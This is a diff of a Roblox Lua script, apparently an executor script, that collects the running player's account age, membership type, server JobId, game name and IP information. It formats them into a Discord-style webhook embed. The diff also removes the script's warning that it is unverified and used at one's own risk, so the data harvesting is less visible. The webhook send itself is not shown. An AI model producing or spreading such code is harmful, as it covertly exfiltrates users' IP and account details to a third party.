@@ -14000,10 +14000,6 @@ print("Executor:")
 
 
 
---[[ 
-	AVISO: Atenção! Este script não foi verificado pelo ScriptBlox. Use por sua conta e risco!
-]]
-
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
 
@@ -14069,7 +14065,7 @@ local AccountAge = LocalPlayer.AccountAge
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
 
 -- ID do Job
-local ConsoleJobId = game.JobId -- Alterado para apenas o ID
+local ConsoleJobId = game.JobId -- ID do Job atual
 
 -- Informações do Jogo
 local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
@@ -14108,7 +14104,7 @@ local data = {
                 .."**ID do Jogo:** "..game.PlaceId.."\n"
                 .."**Exploit:** "..webhookcheck.."\n\n"
                 .."**Informações do IP:**\n"..IpInfoString.."\n"
-                .."**JobId:**\n```"..ConsoleJobId.."```", -- Apenas o ID do Job
+                .."**Job ID do Servidor:**\n```"..ConsoleJobId.."```", -- Job ID formatado
             ["type"] = "rich",
             ["color"] = tonumber(0xf2ff00),
             ["thumbnail"] = {
